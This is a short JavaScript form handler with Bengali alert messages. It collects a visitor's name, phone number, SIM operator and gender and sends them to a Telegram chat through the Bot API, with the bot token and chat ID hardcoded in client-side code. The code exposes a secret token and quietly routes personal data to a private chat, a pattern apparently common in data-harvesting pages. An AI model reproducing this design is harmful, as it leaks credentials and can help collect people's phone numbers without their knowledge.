document.getElementById("submitForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let name = document.getElementById("name").value;
    let number = document.getElementById("number").value;
    let sim = document.getElementById("sim").value;
    let gender = document.getElementById("gender").value;

    if (name === "" || number === "") {
        alert("সব তথ্য সঠিকভাবে পূরণ করুন!");
        return;
    }

    let message = `😋 লিঙ্গ : ${gender}\n💥নাম : ${name}\n💬সিম : ${sim}\n👌নাম্বার : ${number}`;
    
    let botToken = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";
    let chatId = "7294674899";

    let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(telegramUrl)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                document.getElementById("popup").style.display = "flex";
                setTimeout(() => {
                    document.getElementById("popup").style.display = "none";
                }, 3000);
            } else {
                alert("সার্ভারে সমস্যা হয়েছে! আবার চেষ্টা করুন।");
            }
        })
        .catch(error => alert("ইন্টারনেট সমস্যা বা বট আইডি ভুল!"));

    document.getElementById("submitForm").reset();
});
